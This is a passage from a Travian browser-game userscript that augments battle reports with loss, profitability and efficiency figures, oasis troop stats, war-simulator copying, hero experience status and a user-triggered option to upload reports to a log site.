					// Recupera la cantidades de tropa de cada tipo que han intervenido
					var u = uc[$tags('img', tt.rows[1].cells[j])[0].src.replace(/.*\/.*\//, '').replace(/\..*/, '')];
					var unitsLost = 0;

					if (!countPrisonersAsLosses || (gotPrisoners && gotPrisoners != 3)) //no casualties and captured/freed, or unit casualties
					{
						unitsLost = tt.rows[3] ? tt.rows[3].cells[j].innerHTML : 0; //use row 3, which is either casualties, or no casualties and units captured.
						// Basandose en el coste por unidad y su capacidad, se calculan las perdidas y la capacidad de carga total
						var ptu = arrayByN(u, unitsLost);
						perds[g] = arrayAdd(perds[g], ptu.slice(0, 4));
					}
					if (gotPrisoners && gotPrisoners != 3)
					{ //if we had prisoners captured and unit casualties
						if (!countPrisonersAsLosses)
						{
							unitsLost = tt.rows[gotPrisoners] ? tt.rows[gotPrisoners].cells[j].innerHTML : 0; //use our captured line
							// Basandose en el coste por unidad y su capacidad, se calculan las perdidas y la capacidad de carga total
							var ptu = arrayByN(u, unitsLost);
							perds[g] = arrayAdd(perds[g], ptu.slice(0, 4));
						}
					}
					carry[g] += (tt.rows[2] ? tt.rows[2].cells[j].innerHTML - unitsLost : 0) * u[4];
				}

				// Anyade la nueva informacion como una fila adicional en cada tabla  // Anyade nouvelles informations supplémentaires comme une rangée de chaque tableau
				var informe = $elem("TD");
				for (var i = 0; i < 4; i++)
				{
					//# TMR
					informe.innerHTML += '<img src="' + img('r/' + (i + 1) + '.gif') + '" width="18" height="12" border="0" title="' + T('RECURSO' + (i + 1)) + '">';
					informe.innerHTML += perds[g][i];
					if (i < 3)
						informe.innerHTML += ' + ';
					else
						informe.innerHTML += ' = ';
				}
				var perdidas = arrayToInt(perds[g]);
				informe.innerHTML += perdidas;
				informe.colSpan = num_elementos;
				informe.className = "s7";
			/*	var fila = $elem("TR");
				fila.className = "cbg1";
				fila.appendChild($elem("TD", T('PERDIDAS'))); //suppression Ligne du tableau "Pertes en matériels" dans rapport combat : Ligne 3885
				fila.appendChild(informe); //suppression Ligne du tableau "Pertes en matériels" dans rapport combat
				tt.appendChild(fila);
			*/
				// Solo para el atacante se calcula y muestra la rentabilidad y eficiencia del ataque
				// don't print efficiency and profit for scout reports
				if (!isScoutAttackReport() && g == 0 && botin != null)
				{
					var datos = $elem("TD");
					var fila_datos = $elem("TR");
					datos.colSpan = num_elementos;

					// La rentabilidad muestra el botin en comparacion con las perdidas
					var rentabilidad = Math.round((botin - perdidas) * 100 / botin);
					if (botin == 0)
						if (perdidas == 0)
							rentabilidad = 0;
						else
							rentabilidad = -100;
					datos.innerHTML = rentabilidad + "%";
					datos.className = "s7";
					fila_datos.className = "cbg1";
					fila_datos.appendChild($elem("TD", T('RENT')));
					fila_datos.appendChild(datos);
					tt.appendChild(fila_datos);

					var datos = $elem("TD");
					var fila_datos = $elem("TR");
					datos.colSpan = num_elementos;

					// La eficiencia muestra el botin en comparacion con la cantidad de tropas utilizadas
					var eficiencia = 100 - Math.round((carry[g] - botin) * 100 / carry[g]);
					if (carry[g] == 0)
						eficiencia = 0;
					datos.innerHTML = eficiencia + "%";
					datos.className = "s7";
					fila_datos.className = "cbg1";
					fila_datos.appendChild($elem("TD", T('EFICIENCIA')));
					fila_datos.appendChild(datos);
					tt.appendChild(fila_datos);
				}
			}
		}
		//else var tt = t.snapshotItem(0);
		location.href.match(/id=(\d+)/);
		var delreporthref = 'berichte.php\?n1=' + RegExp.$1 + '&del=Delete';
		var delreport = $elem("TR");
		delreport.className = "cbg1";
		delreport.innerHTML = '<td class=rgb colspan=2>&nbsp;<input style="font-weight:bold; font-size:8pt; height:14pt" onClick="document.location.href=\'' + delreporthref + '\'" type=button value="' + T('ELIMINAR') + '">';
		find("//table//table[@class='tbg']", XPFirst).parentNode.appendChild(delreport);
	}

	function copyNatureInOasis() { //Based on Travian: Battle Analyse
		var nn = get('pr');
		if(nn != null) {
			imgc = $elem('img', '', {
				'id': 'tba_imgcopy',
				'title': T('LBA17'),
				'src': imagenes['imgcopy']
			}, {
				'cursor': 'pointer'
			}, nn.childNodes[1]);
			imgc.addEventListener('click', function(ev){
				var form = $elem('form', '', {
					'method': 'post',
					'action': 'warsim.php'
				}, {}, $tags('body')[0]);
				var input = $elem('input', '', {
					'type': 'hidden',
					'name': 'a1_v',
					'value': '1'
				}, {}, form);
				input = $elem('input', '', {
					'type': 'hidden',
					'name': 'a2',
					'value': '4'
				}, {}, form);
				input = $elem('input', '', {
					'type': 'hidden',
					'name': 'ktyp',
					'value': '2'
				}, {}, form);
				input = $elem('input', '', {
					'type': 'hidden',
					'name': 'uid',
					'value': userID
				}, {}, form);
				input = $elem('input', '', {
					'type': 'hidden',
					'name': 's1',
					'value': 'ok'
				}, {}, form);
				var str = '';
				var tdl = find('//div[@id="pr"]/table[@class="f10"]//td', XPList);
				var race = parseInt($tags('img', tdl.snapshotItem(0))[0].src.match(/u\/(\d+)/)[1] / 10);
				for(var i = 0; i < tdl.snapshotLength; i += 3){
					var ut = parseInt($tags('img', tdl.snapshotItem(i))[0].src.match(/u\/(\d+)/)[1]);
					var uc = parseInt(tdl.snapshotItem(i + 1).textContent);
					str = str + ut + ',' + uc + ',';
				}
				createCookie('oasis_' + server, str);
				form.submit();
			}, true);
			oasisInfo();
		}
	}

	function oasisInfo(){
		var m = [0, 0, 0, 0];
		var tdl = find('//div[@id="pr"]/table[@class="f10"]//td', XPList);
		if($tags('img', tdl.snapshotItem(0))[0].src.match(/u\/(\d+)/) == undefined){
			get('tba_imgcopy').style.display = 'none';
			return;
		}
		var race = parseInt($tags('img', tdl.snapshotItem(0))[0].src.match(/u\/(\d+)/)[1] / 10) * 10;
		for(var i = 0; i < tdl.snapshotLength; i += 3){
			var ut = parseInt($tags('img', tdl.snapshotItem(i))[0].src.match(/u\/(\d+)/)[1]) - race - 1;
			var uc = parseInt(tdl.snapshotItem(i + 1).textContent);
			m[0] = m[0] + uc * nature[ut][0];	//att
			m[1] = m[1] + uc * nature[ut][1];	//def1
			m[2] = m[2] + uc * nature[ut][2];	//def2
			m[3] = m[3] + uc * nature[ut][7];	//food
		}
		$elem('br', '', {}, {}, 'pr');
		var trep = $elem("table", "", {}, {}, 'pr');
		var row1 = $elem("tr", "", {}, {}, trep);
		var row2 = $elem("tr", "", {}, {}, trep);
		var row3 = $elem("tr", "", {}, {}, trep);
		var row4 = $elem("tr", "", {}, {}, trep);

		$elem("td", '<img src="' + img('a/att_all.gif') + '" title="' + T('LBA0') + '">*' + m[0], {'align': 'left'}, {}, row1);
		$elem("td", '<img src="' + img('a/def_i.gif') + '" title="' + T('LBA2') + '">*<span id="ats1">' + m[1] + '</span>', {'align': 'lfet'}, {}, row2);
		$elem("td", '<img src="' + img('a/def_c.gif') + '" title="' + T('LBA3') + '">*<span id="ats2">' + m[2] + '</span>', {'align': 'left'}, {}, row3);
		$elem("td", '<img src="' + img('r/5.gif') + '" title="' + T('LBA10') + '">*<span id="ats4">' + m[3] + '</span>', {'align': 'left'}, {}, row4);
	}

	function pasteInWarsim()
	{	if(readCookie('oasis_' + server) == undefined)
			createCookie('oasis_' + server, '');
		if(find('//table[@class="f10"]', XPList).snapshotLength > 0)
		{	var nn = find('//table[@class="f10"]/tbody/tr/td[2]/div', XPList);
			if(nn.snapshotLength == 0)
				return;
			imgpa = $elem('img', '', {
				'id': 'ba_imgp',
				'title': T('LBA18'),
				'src': imagenes['imgpaste']
			}, {'cursor': 'pointer'});
			imgpa.addEventListener('click', function (ev)
			{	var mass = readCookie('oasis_' + server).split(',');
				if($names('a2_' + mass[0]).length == 0)
					return;
				for(var i = 1; i < 11; i++)
					$names('a2_' + (30 + i))[0].value = 0;
				for(var i = 0; i < mass.length - 1; i += 2)
					$names('a2_' + mass[i])[0].value = mass[i + 1];
			}, false);
			nn.snapshotItem(0).childNodes[0].appendChild(imgpa);
			var mass = readCookie('oasis_' + server).split(',');
			if($names('a2_' + mass[0]).length == 0)
				imgpa.style.display = 'none';
		};
	}

	function parseBattleAnalyse()
	{
		var BattleAnalyse = readCookie("BattleAnalyse" + server);
		if (BattleAnalyse == true || BattleAnalyse == null)
		{
			var tab;
			var warsim = 0;

			var worksave = 1;
			var saveBeta = '';

			function mainBattleAnalyse()
			{
				if(readCookie('oasis_' + server) == undefined)
					createCookie('oasis_' + server, '');

				tab = find("//table[@class='tbg']/tbody", XPList);
				if (window.location.href.match(/warsim.php/))
				{	if(tab.snapshotLength < 3)
						return;
				// Warsim
					warsim = 1;
				// End Warsim
				}else
				{
					if(tab.snapshotItem(1) == undefined) return;
					if(tab.snapshotItem(1).parentNode.id == 'MeXaon_ver_table') return;
					if($tags("td", tab.snapshotItem(1).parentNode).length < 24) return;
					if($tags("td", tab.snapshotItem(1))[0].textContent.charCodeAt(0) == 160) return;
					// fix anchors
						var fa = $tags('a', tab.snapshotItem(0));
						for( var i = 0; i < fa.length; i++)
							fa[i].href = fa[i].href;
					//

					if (worksave > 1)
						saveBeta = getInnerText(tab.snapshotItem(0));
					else
						saveBeta = '<table><tbody>' + tab.snapshotItem(0).innerHTML + '</tbody></table>';
				}

				table = $tags("td", tab.snapshotItem(1 - warsim));
				attacktable();
				for(var i = (2 - warsim); i < tab.snapshotLength; i++)
				{
					if(tab.snapshotItem(i).parentNode.id != 'MeXaon_ver_table')
					{
						table = $tags("td", tab.snapshotItem(i));
						deftable();
					};
				}
				generatereport();
			}

			function attacktable()
			{
				var statushero = 0;
				var statustrap = 0;
				var troops = 0; //1-romans 2-teutons 3-gauls
				var lostres = new Array(0,0,0,0);
				var atstemp = new Array(0,0,0,0,0,0,0,0,0,0);
				if(table[3 - warsim * 2].innerHTML.indexOf("u/1.gif") > 0) troops = 1;
				if(table[3 - warsim * 2].innerHTML.indexOf("u/11.gif") > 0) troops = 2;
				if(table[3 - warsim * 2].innerHTML.indexOf("u/21.gif") > 0) troops = 3;
				switch (troops)
				{
					case 1: tm = romans; break;
					case 2: tm = teutons; break;
					case 3: tm = gauls; break;
					default: tm = null; break;
				}
				var rescell = find("//tr[@class='cbg1']/td[@class='s7']", XPFirst);
				if(tm != null)
				{
					if(table[13 - warsim * 2].innerHTML.indexOf("img") > 0) {statushero = 1; ats[5] = 1;}
					var tda = 14 + statushero - warsim * 2;
					var tdl = 25 + statushero * 2 - warsim * 2;
					var tdt = 0;
					if(!warsim && (table.rows > 4))
						if(table[36 + statushero * 3].getAttribute('colspan') == null)
							tdt = 36 + statushero * 3;
					for(var i = 0; i <= (9 + statushero); i++)
					{
						atstemp[0] = atstemp[0] + table[tda + i].textContent * tm[i][0];
						lostres[0] = lostres[0] + table[tdl + i].textContent * tm[i][3];
						lostres[1] = lostres[1] + table[tdl + i].textContent * tm[i][4];
						lostres[2] = lostres[2] + table[tdl + i].textContent * tm[i][5];
						lostres[3] = lostres[3] + table[tdl + i].textContent * tm[i][6];
						atstemp[4] = atstemp[4] + table[tda + i].textContent * tm[i][7];
						atstemp[6] = atstemp[6] + table[tdl + i].textContent * tm[i][7];
						atstemp[8] = atstemp[8] + table[tda + i].textContent * tm[11][i] * tm[i][0];
						atstemp[9] = atstemp[9] + table[tda + i].textContent * tm[12][i] * tm[i][0];
						if(tdt != 0)
						{
							atstemp[7] = atstemp[7] + table[tdt + i].textContent * tm[i][7];
							atstemp[3] = atstemp[3] + (table[tda + i].textContent - table[tdl + i].textContent - table[tdt + i].textContent) * tm[i][9];
						}else
							atstemp[3] = atstemp[3] + (table[tda + i].textContent - table[tdl + i].textContent) * tm[i][9];
					}
					atstemp[1] = lostres[0] + lostres[1] + lostres[2] + lostres[3];
					if (rescell != null)
					{
						res = rescell.textContent.split(" ");
						atstemp[2] = parseInt(res[0]) + parseInt(res[1]) + parseInt(res[2]) + parseInt(res[3]);
//					rescell.appendChild(elem('span','<i><b> ('+atstemp[2]+')</b></i>', null, null, 'f8'));

						rescell.innerHTML = '';
						for(var i = 0; i < 4; i++)
							rescell.innerHTML += '<img src="' + img('r/' + (i + 1) + '.gif') + '" class="res" title="' + T('RECURSO' + (i+1)) + '"> ' + res[i] + '&nbsp;';

						rescell.innerHTML = '' + rescell.innerHTML + ' <img src="' + imagenes["imgpackgo"] + '" title="' + T('total') + '"> <i><b class="f8">(' + atstemp[2] + ')</b></i>';
					}
					attHTML = '<img src="' + imagenes["imgatti"] + '" align="left" height="15" width="15" style="padding-left: 3px">&nbsp;<font class="f8"><i>' + atstemp[8] + '</i></font><br>';
					attHTML += '<img src="' + imagenes["imgattc"] + '" align="left" height="15" width="15" style="padding-left: 3px">&nbsp;<font class="f8"><i>' + atstemp[9] + '</i></font><br>';
					attHTML += '<img title="' + T('LBA0') + '" src="' + img('a/att_all.gif') + '" align="left" height="15" width="15" style="padding-left: 3px">&nbsp;<font class="f8"><i>' + atstemp[0] + '</i></font>';
					table[2 - warsim * 2].innerHTML = attHTML;
					rowi = $elem("tr");
					cell1 = $elem("td", '<font class="f8"><i>' + T('PERDIDAS') + '</i></font>', {}, {}, rowi);
					cell2 = $elem("td", "",
					{
						"align": "left",
						"colspan": 10 + statushero
					}, {}, rowi);

					for(var i = 0; i < 4; i++)
					{
//					cell2.innerHTML='<font class="f8"><i><img src="'+img('r/1.gif')+'" class="res" title="' + T('RECURSO'+i) + '">'+lostres[0]+'&nbsp;<img src="'+img('r/2.gif')+'">'+lostres[1]+'&nbsp;<img src="'+img('r/3.gif')+'">'+lostres[2]+'&nbsp;<img src="'+img('r/4.gif')+'">'+lostres[3]+'&nbsp; <b>(-'+atstemp[1]+')</b></i></font>';
						cell2.innerHTML += '<img src="' + img('r/' + (i + 1) + '.gif') + '" class="res" title="' + T('RECURSO' + (i + 1)) + '"> ' + lostres[i] + '&nbsp;';
					}

					cell2.innerHTML='<font class="f8"><i>' + cell2.innerHTML + ' <img src="' + imagenes["imgpackgo"] + '" title="' + T('TOTAL') + '"> <b>(-' + atstemp[1] + ')</b></i></font>';
					table[0].parentNode.parentNode.appendChild(rowi);
				};
				for(var i = 0; i < ats.length; i++)
					ats[i] = ats[i] + atstemp[i];
			};

			function deftable()
			{
				var statushero = 0;
				var troops = 0; //1-romans 2-teutons 3-gauls 4-nature
				var lostres = new Array(0,0,0,0);
				var dtstemp = new Array(0,0,0,0,0,0);
				var lostEnable = 1
				if(table[3 - warsim * 2].innerHTML.indexOf("u/1.gif") > 0) troops = 1;
				if(table[3 - warsim * 2].innerHTML.indexOf("u/11.gif") > 0) troops = 2;
				if(table[3 - warsim * 2].innerHTML.indexOf("u/21.gif") > 0) troops = 3;
				if(table[3 - warsim * 2].innerHTML.indexOf("u/31.gif") > 0) troops = 4;
				switch (troops)
				{
					case 1: tm = romans; break;
					case 2: tm = teutons; break;
					case 3: tm = gauls; break;
					case 4: tm = nature; break;
					default: tm = null; break;
				}
				if(tm != null)
				{
					if(table[13].innerHTML.indexOf("img") > 0) {statushero = 1; dts[4] = 1;}
					var tda = 14 + statushero - warsim * 2;
					var tdl = 25 + statushero * 2 - warsim * 2;
					if (!table[tdl])
						lostEnable = 0;
					for(var i = 0; i <= (9 + statushero); i++)
					{
						dtstemp[0] = dtstemp[0] + table[tda + i].textContent * tm[i][1];	// def1
						dtstemp[1] = dtstemp[1] + table[tda + i].textContent * tm[i][2];	// def2
						dtstemp[3] = dtstemp[3] + table[tda + i].textContent * tm[i][7];
						if (lostEnable)
						{
							lostres[0] = lostres[0] + table[tdl + i].textContent * tm[i][3];
							lostres[1] = lostres[1] + table[tdl + i].textContent * tm[i][4];
							lostres[2] = lostres[2] + table[tdl + i].textContent * tm[i][5];
							lostres[3] = lostres[3] + table[tdl + i].textContent * tm[i][6];
							dtstemp[5] = dtstemp[5] + table[tdl + i].textContent * tm[i][7];
						}
					}
					dtstemp[2] = lostres[0] + lostres[1] + lostres[2] + lostres[3];
					table[2 - warsim * 2].innerHTML = '<img title="' + T('LBA2') + '" src="' + img('a/def_i.gif') + '" align="middle" height="15" width="15">&nbsp;<font class="f8"><i>' + dtstemp[0] + '</i></font><br><img title="' + T('LBA3') + '" src="' + img('a/def_c.gif') + '" align="middle" height="15" width="15">&nbsp;<font class="f8"><i>' + dtstemp[1] + '</i></font>';
					rowi = $elem("tr");
					cell1 = $elem("td", '<font class="f8"><i>' + T('PERDIDAS') + '</i></font>', {}, {}, rowi);
					cell2 = $elem("td", "", {
						"align": "left",
						"colspan": 10 + statushero
					}, {}, rowi);
//			cell2.innerHTML='<font class="f8"><i><img src="'+img('r/1.gif')+'">'+lostres[0]+'&nbsp;<img src="'+img('r/2.gif')+'">'+lostres[1]+'&nbsp;<img src="'+img('r/3.gif')+'">'+lostres[2]+'&nbsp;<img src="'+img('r/4.gif')+'">'+lostres[3]+'&nbsp; <b>(-'+dtstemp[2]+')</b></i></font>';
					for(var i = 0; i < 4; i++)
						cell2.innerHTML += '<img src="' + img('r/' + (i + 1) + '.gif') + '" _class="res" title="' + T('RECURSO' + (i + 1)) + '"> ' + lostres[i] + '&nbsp;';
					cell2.innerHTML = '<font class="f8"><i>' + cell2.innerHTML + ' <img src="' + imagenes["imgpackgo"] + '" title="' + T('TOTAL') + '"> <b>(-' + dtstemp[2] + ')</b></i></font>';
					table[0].parentNode.parentNode.appendChild(rowi);
				};
				for(var i = 0; i < dts.length; i++)
					dts[i] = dts[i] + dtstemp[i];
			}

			function generatereport()
			{
				if(ats[3] == 0) ats[2] = 0;
				var lostA = ats[2] - ats[1];
				var lostB = dts[2] + ats[2];

				trep = $elem("table", "", {
					"cellpadding": 2,
					"cellspacing": 1,
					"class": "tbg"
				});
				row1 = $elem("tr", "", {"class": "cbg1"}, {}, trep);
				row2 = $elem("tr", "", {}, {}, trep);
				row3 = $elem("tr", "", {}, {}, trep);
				row4 = $elem("tr", "", {}, {}, trep);
				row5 = $elem("tr");
				row6 = $elem("tr");

				cell = $elem("td", {"colspan": 5}, {}, row1);
				$elem("b", T('LBA4'), {"class": "c1 b"}, {}, cell);

				cell1 = $elem("td", "&nbsp;", {}, {}, row2);
				cell2 = $elem("td", "", {}, {}, row2);
				$elem("font", "<i>" + T('LBA5') + "</i>", {"class": "f8"}, {}, cell2);
				cell3 = $elem("td", "", {}, {}, row2);
				$elem("font", "<i>" + T('LBA6') + "</i>", {"class": "f8"}, {}, cell3);
				cell4 = $elem("td", "", {}, {}, row2);
				$elem("font", "<i>" + T('LBA7') + "</i>", {"class": "f8"}, {}, cell4);
				cell5 = $elem("td", "", {}, {}, row2);
				$elem("font", "<i>" + T('CAPA') + "</i>", {"class": "f8"}, {}, cell5);

				cell1 = $elem("td", T('LBA15'), {"class": "c2 b"}, {}, row3);
				cell2 = $elem("td", lostA + '*<img src="' + img('r/4.gif') + '" title="' + T('LBA9') + '">', {"align": "right"}, {}, row3);
				cell3 = $elem("td", ats[4] + '*<img src="' + img('r/5.gif') + '" title="' + T('LBA10') + '">', {"align": "right"}, {}, row3);
				cell4 = $elem("td", "", {"align": "right"}, {}, row3);
				if(ats[5] == 0)
					cell4.innerHTML = '0*<img src="' + img('a/del.gif') + '" title="' + T('LBA11') + '">';
				else
					cell4.innerHTML= dts[5] + '*<img src="' + img('u/hero.gif') + '" title="' + T('LBA12') + '">';
				cell5 = $elem("td", ats[2] + '*<img src="' + imagenes["imgpackgo"] + '" title="' + T('LBA13') + '"><br>' + ats[3] + '*<img src="' + imagenes["imgpack"] + '" title="' + T('LBA14') + '">', {
					"align": "right",
					"rowspan": 2
				}, {}, row3);

				cell1 = $elem("td", T('LBA16'), {"class": "c1 b"}, {}, row4);
				cell2 = $elem("td", (-lostB) + '*<img src="' + img('r/4.gif') + '" title="' + T('LBA9') + '">', {"align": "right"}, {}, row4);
				cell3 = $elem("td", dts[3] + '*<img src="' + img('r/5.gif') + '" title="' + T('LBA10') + '">', {"align": "right"}, {}, row4);
				cell4 = $elem("td", "", {"align": "right"}, {}, row4);
				if(dts[4] == 0)
					cell4.innerHTML = '0*<img src="' + img('a/del.gif') + '" title="' + T('LBA11') + '">';
				else
					cell4.innerHTML = ats[6] + '*<img src="' + img('u/hero.gif') + '" title="' + T('LBA12') + '">';

				if (warsim != 1 && worksave >= 1)
				{
					cell1 = $elem("td", "", {
						'colspan': 5,
						'align': 'left'
					}, {}, row6);

					var travilogForm = $elem("form", "", {
						'action': 'http://travilog.org.ua',
						'method': 'post',
						'target': 'tba_travilogIFrame',
						'id': 'tba_travilogForm'
					}, {}, cell1);

					travilogForm.addEventListener('submit', function()
					{
						get("tba_travilogIframeRow").style.display = "";
						get("tba_travilogIframeRowDiv").style.display = "";
						get("tba_travilogIFrameId").style.display = "none";
					}, false);

					var data1 = $elem("input", "", {
						"type": "hidden",
						"name": "new_old",
						"value": "new"
					}, {}, travilogForm);

					var data2 = $elem("input", "", {
						"type": "hidden",
						"name": "act",
						"value": "inputlog"
					}, {}, travilogForm);

					var data3 = $elem("input", "", {
						"type": "hidden",
						"name": "server",
						"value": ""
					}, {}, travilogForm);

					var data4 = $elem("input", "", {
						"type": "hidden",
						"name": "lng",
						"value": ext ? ext : 'en'
					}, {}, travilogForm);

					var data5 = $elem("input", "", {
						"type": "hidden",
						"name": "tools",
						"value": (worksave > 1) ? "" : "tba"
					}, {}, travilogForm);

					var data6 = $elem("input", "", {
						"type": "hidden",
						"name": "GMT",
						"value": new Date().getTimezoneOffset()
					}, {}, travilogForm);

					var data7 = $elem("input", "", {
						"type": "hidden",
						"name": "text",
						"value": saveBeta
					}, {}, travilogForm);

					var button1 = $elem("input", "", {
						"type": "submit",
						"onclick": "document.getElementById('tba_travilogForm').submit()",
						"value": T("SAVEREPORT")
					}, {}, travilogForm);

					var button2 = $elem("input", "", {
						"type": "checkbox",
						"name": "anonymous",
						"value": 1
					}, {}, travilogForm);

					$elem("span", T("ANONYMIZE"), {}, {}, travilogForm);
					row7 = $elem("tr", "", {"id": 'tba_travilogIframeRow'}, {"display": "none"});
					cell1 = $elem("td", "", {'colspan': '5'}, {}, row7);
			//		cell1.setAttribute('align', 'left');

					var divLoading = $elem('div', "<b>--= Loading =--</b>", {"id": 'tba_travilogIframeRowDiv'}, {}, cell1);
					var travilogIFrame = $elem("iframe", "Loading", {
						"name": 'tba_travilogIFrame',
						"id": 'tba_travilogIFrameId'
					}, {
						'border': '0px',
						'width': '100%',
						'height': '7.5em'
					}, cell1);

					travilogIFrame.addEventListener('load', function()
					{
						get("tba_travilogIFrameId").style.display = "";
						get("tba_travilogIframeRowDiv").style.display = "none";
					}, false);
				}
				if (warsim != 1 && worksave >= 1)
				{
					trep.appendChild(row5);
					trep.appendChild(row6);
					trep.appendChild(row7);
				}
				$tags("td", tab.snapshotItem(0))[5].appendChild($elem("p"));
				if(warsim == 0)
					$tags("td", tab.snapshotItem(0))[5].appendChild(trep);
				else
				{
					tab.snapshotItem(1).parentNode.parentNode.insertBefore(trep, tab.snapshotItem(1).parentNode.nextSibling);
					tab.snapshotItem(1).parentNode.parentNode.insertBefore($elem('p'), tab.snapshotItem(1).parentNode.nextSibling);
				};
			}
			mainBattleAnalyse();
		}
	}

	function genreporta2b()
	{
		var BattleAnalyse = readCookie("BattleAnalyse" + server);
		if (BattleAnalyse == true || BattleAnalyse == null)
		{
			var trep = $elem("table", "", {
				'cellpadding': 2,
				'cellspacing': 1,
				'class': 'tbg'
			});
			var row1 = $elem("tr", "", {"class": "cbg1"}, {}, trep);
			var row2 = $elem("tr", "", {}, {}, trep);
			var row3 = $elem("tr", "", {}, {}, trep);

			var cell = $elem("td", "", {"colspan": 5}, {}, row1);
			$elem("b", T('LBA4'), {"class": "c1 b"}, {}, cell);

			var cell1 = $elem("td", "", {'colspan': 3}, {'width': '60%'}, row2);
			$elem("font", "<i>" + T('LBA15') + "</i>", {"class": "f8"}, {}, cell1);
			var cell3 = $elem("td", "", {}, {'width': '20%'}, row2);
			$elem("font", "<i>" + T('LBA6') + "</i>", {"class": "f8"}, {}, cell3);
			var cell5 = $elem("td", "", {}, {'width': '20%'}, row2);
			$elem("font", "<i>" + T('CAPA') + "</i>", {"class": "f8"}, {}, cell5);

			cell1 = $elem("td", '<span id="ats0">' + ats[0] + '</span>*<img src="' + img('a/att_all.gif') + '" title="' + T('LBA0') + '">', {"align": "right"}, {}, row3);
			var cell2 = $elem("td", '<span id="ats1">' + ats[1] + '</span>*<img src="' + img('a/def_i.gif') + '" title="' + T('LBA2') + '">', {"align": "right"}, {}, row3);
			cell3 = $elem("td", '<span id="ats2">' + ats[2] + '</span>*<img src="' + img('a/def_c.gif') + '" title="' + T('LBA3') + '">', {"align": "right"}, {}, row3);
			var cell4 = $elem("td", '<span id="ats4">' + ats[4] + '</span>*<img src="' + img('r/5.gif') + '" title="' + T('LBA10') + '">', {"align": "right"}, {}, row3);
			cell5 = $elem("td", '<span id="ats3">' + ats[3] + '</span>*<img src="' + imagenes["imgpack"] + '" title="' + T('LBA14') + '">', {"align": "right", "rowspan": 2}, {}, row3);

			var t = find('//div[@id="lmid2"]/form/table[@class="f10"]', XPList);
			if (t.snapshotLength != 0)
			{	t.snapshotItem(0).parentNode.insertBefore(trep, t.snapshotItem(0));
				t.snapshotItem(0).parentNode.insertBefore($elem('p'), t.snapshotItem(0));
			}
		}
	}

	function a2b()
	{
		var BattleAnalyse = readCookie("BattleAnalyse" + server);
		if (BattleAnalyse == true || BattleAnalyse == null)
		{
			var ats = [0,0,0,0,0,0,0,0];
			var list = find('//table[@class="p1"]/tbody/tr/td/table[@class="f10"]/tbody/tr/td/input', XPList);
			if(list.snapshotLength == 0){/*alert('Error:Find Table,a2b'); */return;}
			if(list.snapshotItem(0).parentNode.parentNode.childNodes[1].innerHTML.indexOf("u/1.gif") > 0) troops = 1;
			if(list.snapshotItem(0).parentNode.parentNode.childNodes[1].innerHTML.indexOf("u/11.gif")> 0) troops = 2;
			if(list.snapshotItem(0).parentNode.parentNode.childNodes[1].innerHTML.indexOf("u/21.gif")> 0) troops = 3;
			switch (troops)
			{
				case 1: tm = romans; break;
				case 2: tm = teutons; break;
				case 3: tm = gauls; break;
				default: tm = null; break;
			}
			if(tm == null){alert('Error:Bad troops,a2b'); return;}
			for(var i = 0; i < list.snapshotLength; i++)
			{
				unit = parseInt(list.snapshotItem(i).getAttribute('name').match(/(\d+)/)[1]) - 1;
				val = parseInt(list.snapshotItem(i).value);
				if(isNaN(val)) val = 0;
				ats[0] = ats[0] + val * tm[unit][0];	// attack
				ats[1] = ats[1] + val * tm[unit][1];	// def1
				ats[2] = ats[2] + val * tm[unit][2];	// def2
				ats[3] = ats[3] + val * tm[unit][9];	// load
				ats[4] = ats[4] + val * tm[unit][7];	// food
			}
			eats0 = get('ats0');
			eats1 = get('ats1');
			eats2 = get('ats2');
			eats3 = get('ats3');
			eats4 = get('ats4');
			eats0.textContent = ats[0];
			eats1.textContent = ats[1];
			eats2.textContent = ats[2];
			eats3.textContent = ats[3];
			eats4.textContent = ats[4];
		}
	}

	/**
	* In development by Booboo inspired from MeXaon's travian hero status
	* script.
	**/
	function heroStatus()
	{	var table = find("//a[contains(@href, '&rename')]/ancestor::tbody", XPFirst);
		if (table)
		{	var dir1 = textDirection == "ltr" ? "left" : "right";
			var dir2 = textDirection == "ltr" ? "right" : "left";
			var td = $tags("td", table);
			var herosLevel = parseInt(td[0].textContent.match(/\s+(\d+)\s+\(/)[0]);
			var percent = parseInt(td[28].textContent.match(/\d+/));
			var baseXP = herosLevel*50*(herosLevel+1);
			var XPforNextLevel = 100*(herosLevel+1);
			var levelBound = baseXP + XPforNextLevel;
			var actualXP = baseXP+XPforNextLevel*percent/100;
			table = $elem("table", "", {"width": "100%"}, {}, td[27]);
			var tr = $elem('tr', '', {}, {}, table);
			$elem("td", T("THS0"), {"align": dir1}, {"fontWeight": "bold"}, tr);
			$elem("td", actualXP, {"align": dir2}, {"color": "#280"}, tr);
			var tr = $elem('tr', '', {}, {}, table);
			$elem("td", T("THS1"), {"align": dir1}, {"fontWeight": "bold"}, tr);
			$elem("td", levelBound, {"align": dir2}, {"fontWeight": "bold"}, tr);
			var tr = $elem('tr', '', {}, {}, table);
			$elem("td", T("THS2"), {"align": dir1}, {"fontWeight": "bold"}, tr);
			$elem("td", levelBound-actualXP, {"align": dir2}, {"color": "orange"}, tr);
		}
	}

	/** Faire une page de résumé de la production */
	function preCalculate1()
	{
		var datos = 0;
		var capital = readCookie("capital" + server + userID, 0);
		/*if (!capital)
		{
			capital = prompt(decodeEntity(T('TAB28')));
			createCookie(("capital" + server + userID), capital, 365);
		}*/
		var boolIsThisTheCapital;
		if (capital == "") {
			boolIsThisTheCapital = true;
		} else {
			boolIsThisTheCapital = id_aldea == capital;
		};
		var maxlvl;
		if (id_aldea == capital) maxlvl = 25; else maxlvl = 10;
		var currentTotalRes = 0;
		for (i = 0; i < 4; i++) {
		currentTotalRes += parseInt(actual[i]);
		}
				//create the DIV for the coloured level numbers
		var posDIV = $elem("DIV", "", {"id": "resDiv"}, {}, "lmid2");
		if (getDocDirection == 'rtl') {
			posDIV.setAttribute('style', 'position:absolute; top:69px; left:257px; z-index:20;');
		}

		// Crea una matriz inicializada a 0 con todos los posibles niveles de cada tipo de recurso
		var grid = new Array(4);
		for (var i = 0; i < 4; i++)
		{
			grid[i] = new Array(26);
			for (var j = 0; j <= 25; j++)
			{
				grid[i][j] = 0;
			}
		}

		// Solo hay 6 tipos de aldeas de 15 casillas cada uno. Se describe el tipo de resource por casilla
		var dist = [
			[3, 3, 0, 3, 3, 1, 2, 3, 3, 2, 2, 3, 3, 0, 3, 1, 0, 1], // 9 cereales
			[2, 3, 0, 2, 1, 1, 2, 3, 3, 2, 2, 3, 3, 0, 3, 1, 0, 1],
			[0, 3, 0, 2, 1, 1, 2, 3, 3, 2, 2, 3, 3, 0, 3, 1, 0, 1],
